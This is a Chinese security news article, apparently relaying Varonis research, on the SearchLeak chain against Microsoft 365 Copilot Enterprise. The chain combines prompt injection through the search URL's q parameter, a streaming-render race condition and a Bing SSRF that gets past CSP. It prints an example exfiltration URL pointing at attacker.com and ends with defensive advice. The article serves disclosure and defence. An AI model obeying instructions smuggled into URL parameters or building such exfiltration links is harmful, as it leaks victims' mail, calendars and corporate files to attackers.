---
title: SearchLeak漏洞:微软365 Copilot如何沦为一键数据窃取工具
url: https://mp.weixin.qq.com/s/X9xlliFeMxd90MnrNmZvrg
source: Doonsec's feed
date: 2026-06-18
fetch_date: 2026-06-19T06:59:48.521817
---

# SearchLeak漏洞:微软365 Copilot如何沦为一键数据窃取工具

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibO9kiauylaDpnoibwNmuhfd6Hdyb792XlR9Qb0POf6Nem8O69zfHF5rpd3rkmLWHxiaLfMajpglAUase6y19Mom1k0OT9vDiaP1mViba5vsY9Efc/0?wx_fmt=jpeg)

# SearchLeak漏洞:微软365 Copilot如何沦为一键数据窃取工具

原创

黑鸟
黑鸟

黑鸟

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

近日网络安全厂商 Varonis 威胁研究实验室披露了名为 SearchLeak 的关键漏洞链，该漏洞存在于 Microsoft 365 Copilot Enterprise 企业搜索功能中，攻击者只需诱导目标点击一次看似正常的链接，就能悄无声息窃取邮箱验证码、邮件内容、会议信息乃至企业内部私有文件等敏感数据。微软已针对该漏洞发布修复，对应编号为 CVE-2026-42824，安全评级为最高级别的严重。

![](https://mmbiz.qpic.cn/mmbiz_png/ibO9kiauylaDosZTY3UKn9icsaoQOibfzp3DafsRx5fTfUgD8RfpHCysEGfPQ8EhOe4yWicicDs4Pdh49oXy1icG4XtVVCyaXPYfYZwwZ3PpuR8QaQ/640?wx_fmt=png&from=appmsg)

这并非单一漏洞构成的风险，而是三类不同缺陷串联形成的攻击链路，其中既有 AI 应用特有的新型注入风险，也有已存在十余年的经典 Web 安全问题。

SearchLeak 的完整攻击能力由三个独立漏洞共同支撑，每一环都为下一环创造触发条件，最终实现无感知的数据外泄。

三个环节分别是 Parameter-to-Prompt Injection（参数到提示词注入，简称 P2P 注入）、HTML 渲染竞态条件，以及借助 Bing 服务的 SSRF（服务端请求伪造）绕过 CSP（内容安全策略）。

单独来看每个漏洞的危害都相对有限，组合到一起之后，攻击者就能让 Copilot 自动检索目标的全部可访问数据，再通过官方服务把数据悄无声息传到攻击者的服务器。

整个过程不需要插件支持，不需要特殊权限，也不需要受害者进行二次操作，由于链接指向微软官方域名，传统反钓鱼和 URL 防护工具通常不会拦截。由于漏洞针对企业级 Copilot 服务，影响范围不止个人数据，所有受害者账号有权访问的企业内容都可能被窃取，涵盖邮件、会议邀请与笔记、SharePoint 文档、OneDrive 文件等各类已索引的业务数据，如果企业的 M365 环境对接了更多内部系统，波及范围还会进一步扩大。

视频演示：

## 第一阶段 P2P 注入 把 URL 参数变成 AI 执行指令

整条漏洞链的起点，是 Copilot 企业搜索的 URL 参数设计。

Microsoft 365 Copilot Enterprise Search 提供了带参数的直达搜索链接，标准格式为`https://m365.cloud.microsoft/search/?auth=2&origindomain=microsoft365&q=<PROMPT>`。

按照设计初衷，q 参数用于承载用户的自然语言搜索关键词，用来检索企业内部的邮件、会议、文档等内容。但实际运行中，q 参数内的所有内容都会被 Copilot 的 AI 引擎直接识别为可执行的指令，而非单纯的搜索文本。

这一类漏洞被定义为 Parameter-to-Prompt Injection，是 AI 应用特有的新型攻击面。攻击者可以提前在 q 参数中构造完整指令，比如要求 Copilot 检索用户收件箱中的邮件，提取标题后嵌入到图片链接地址中。受害者只需点击这条来自微软官方域名的链接，不需要手动输入任何内容，Copilot 就会自动执行注入的指令，完成对个人及企业可访问数据的检索。研究团队此前在个人版 Copilot 中发现过同类的 Reprompt 漏洞，本以为企业级环境会有更严格的防护校验，最终结果显示企业版搜索功能同样存在这类风险。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibO9kiauylaDoibRnjHZ1JFDThFclKdZcc7zuficoVKm75bsia0qiaAoVicrVxxtia55jnCLIWHrQBzRTicwtOB4ia8K2B0ial3CCic5KSOWfETYgGP5wXk/640?wx_fmt=png&from=appmsg)

## 第二阶段 竞态条件 趁防护生效前完成请求

微软针对 AI 生成内容的安全风险设置了对应防护机制，会将所有输出内容包裹在`<code>`标签内，让浏览器将其识别为纯文本而非可执行的页面代码，从根源上避免 HTML 注入风险。

但这个防护动作存在时序上的缺陷。包裹`<code>`标签的处理，要等 Copilot 完成全部内容生成之后才会执行。而 Copilot 采用流式输出的模式，内容会逐段渲染到浏览器的 DOM（文档对象模型）中。

在生成过程的短暂窗口里，原始的 HTML 代码会直接出现在页面结构里。

攻击者在注入的指令里要求 Copilot 输出带`<img>`标签的内容，当流式输出把`<img>`标签渲染到页面时，浏览器会立刻识别图片标签并发起对应的网络请求。

等到 Copilot 输出完成、防护机制将全部内容包裹进`<code>`标签时，图片请求早已发送完成，数据也已经随之流出。这是典型的竞态条件漏洞，防护逻辑作为后置的处理步骤，无法覆盖浏览器逐段渲染的整个过程，最终给攻击者留下了可利用的时间窗口。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibO9kiauylaDoIicffGJnSZP9nGqVibBBfUsP9ic2Hgicv12InH7NQeMia4Dgx9evX70oNL7Yia6CXq2omIZicibSDkrMxic0YSFV5Wicokv0j6ZOk4xPlw/640?wx_fmt=png&from=appmsg)

## 第三阶段 借道 Bing SSRF 绕过内容安全策略

即便`<img>`标签能触发请求，浏览器的 CSP（内容安全策略）也会限制页面只能加载白名单域名下的资源，攻击者无法直接把图片地址指向自己的服务器，这类请求会被浏览器直接拦截。

而`*.bing.com`属于微软官方域名，自然在 CSP 的白名单当中。Bing 的以图搜图接口支持传入外部图片地址参数，标准格式为`https://www.bing.com/images/searchbyimage?cbir=sbi&imgurl=https://attacker.com/STOLEN_DATA/image.png`。

当这个接口收到请求时，Bing 的服务端会主动发起请求去拉取参数中指定的图片地址，用于后续的图像分析。

这就形成了经典的 SSRF（服务端请求伪造）利用方式。攻击者将窃取到的数据拼接在 imgurl 参数的路径中，再把整个 Bing 接口地址作为`<img>`标签的 src 值。整个请求链路就变成了受害者浏览器向白名单内的 Bing 域名发起图片请求，完全符合 CSP 规则不会被拦截。Bing 服务端收到请求后，再向攻击者控制的服务器发起请求，同时把拼接在路径中的敏感数据带过去。

Bing 服务在整个过程中充当了不知情的数据外泄代理，让浏览器端的 CSP 防护完全失效。

## 完整攻击链路 一次点击即可完成数据窃取

##

把三个环节整合起来，完整的攻击过程门槛极低，只需要受害者完成一次点击操作。攻击者首先构造好包含完整注入指令的 Copilot 搜索链接，通过邮件、Teams、即时通讯软件等任意渠道发送给受害者。

受害者点击链接后，会正常打开微软官方域名下的 Copilot 企业搜索页面，q 参数中的指令会被 Copilot 直接执行，自动检索受害者有权访问的邮箱、日历、SharePoint 以及 OneDrive 中的内容。

Copilot 按照指令生成带`<img>`标签的响应内容，将窃取到的信息拼接在图片 URL 中，通过流式输出渲染到页面。浏览器在防护机制生效前就解析`<img>`标签，向 Bing 的以图搜图接口发起请求。

Bing 服务端接收到请求后，向攻击者的服务器发起图片拉取请求，敏感数据就随着 URL 路径一同记录到攻击者的服务器日志中。整个过程受害者只会看到 Copilot 短暂的加载状态，最终页面上的内容可能看起来有些异常，但此时数据早已完成外泄。攻击者不需要获取任何特殊权限，也不需要诱导受害者安装插件或者进行二次操作，攻击链路全程依托微软官方域名，传统的反钓鱼和 URL 防护工具很难识别拦截。

![](https://mmbiz.qpic.cn/mmbiz_jpg/ibO9kiauylaDrYIEbFsfgoe9B7RNcQCd8Nye7yktrr4moibvhakvQV9JG66V6xCcXchXwbickTaSSBa6n8oiamLABQeAicnmwz9mIic8YFYEKKsLSE/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/ibO9kiauylaDrOFh5oz7W1DZDQMwYNvrTia0NoibuGocB3Wmb7YxgYaibITYXH01gw9GvY7fWnKBYAaiaYkNMicYpu69wZeV8hDuvia1jDrhNQXR3ias/640?wx_fmt=jpeg&from=appmsg)

SearchLeak 最值得关注的价值，在于它是传统安全漏洞与 AI 新型攻击面结合的典型样本。其中通过 Bing 实现的 SSRF、HTML 注入的竞态条件绕过，都是已经存在十多年的经典安全问题，同类的净化时序绕过手法也早有大量公开研究。

单独来看每一个问题的利用门槛都很高，在常规场景下很难造成严重危害。

但 P2P 注入这个 AI 特有的漏洞，给这些传统缺陷创造了触发条件。没有 P2P 注入，攻击者就无法让 Copilot 生成可控的 HTML 内容。

没有竞态条件，生成的 HTML 会被防护机制直接无害化。没有 SSRF 通道，浏览器的 CSP 会阻断最终的数据外泄。

三者缺一不可，而 AI 组件正是串联起整条链路的核心。这也代表了 AI 安全研究的一个重要方向，很多时候风险并非来自全新的 Prompt 注入手法本身，而是 AI 应用给大量原本难以利用的传统漏洞，提供了新的触发路径。

AI 安全防护不能只关注模型本身的对齐与防护，同样需要重新审视整个应用链路里的传统安全风险。

微软已经完成了该漏洞的修复，对于部署了 Microsoft 365 Copilot Enterprise 的企业，安全团队可以从以下几个方向强化防护：

监控异常的 Copilot 搜索 URL，重点排查 q 参数中包含 HTML 标签或者嵌入数据到图片 URL 指令的编码 payload

梳理内容安全策略的白名单域名，任何支持用户传入 URL 并发起服务端请求的白名单域名，都可能成为数据外泄的通道，需要定期审计

将 AI 的流式输出内容视为不可信内容，HTML 净化逻辑需要在渲染阶段同步执行，不能作为后置处理步骤

对于普通用户来说，也可以通过两个习惯降低风险：

点击指向微软 365 服务的链接前留意 URL 参数，带有冗长编码参数的链接需要谨慎对待

如果发现 Copilot 在没有主动发起查询的情况下自动检索邮件等内容，及时向企业安全团队反馈异常

往期：

[别乱安装壁纸! Wallpaper Engine创意工坊恶意壁纸可用于攻击](https://mp.weixin.qq.com/s?__biz=MzAxOTM1MDQ1NA==&mid=2451187069&idx=1&sn=ff71a010e47fcc2a1bf5c3987779a766&scene=21#wechat_redirect)

[灯泡里的赛博图书馆：把重要文件藏进日常照明里](https://mp.weixin.qq.com/s?__biz=MzAxOTM1MDQ1NA==&mid=2451187065&idx=1&sn=ab7b16d3f6da151dd6babdd8a5a192f5&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibO9kiauylaDqicDvERLTuy6Yo2PUS5sCSLCWBlXcichCYke51phlZqJvemVicckicq5cDX67WMuDvDmWX3HQaiaFCeKnMRuEVv2jsQCv90kc27HwE/640?wx_fmt=jpeg&from=appmsg)

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/V9abY6oHTkqrJPe3BMSmUuUaQMPJDnWTSrtbtXBAZSMfj0iaxiaMvM6cnIDqLXBbescHHicaricGUU0tHjJ4BqISKw/0?wx_fmt=png)

黑鸟

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/V9abY6oHTkqrJPe3BMSmUuUaQMPJDnWTSrtbtXBAZSMfj0iaxiaMvM6cnIDqLXBbescHHicaricGUU0tHjJ4BqISKw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过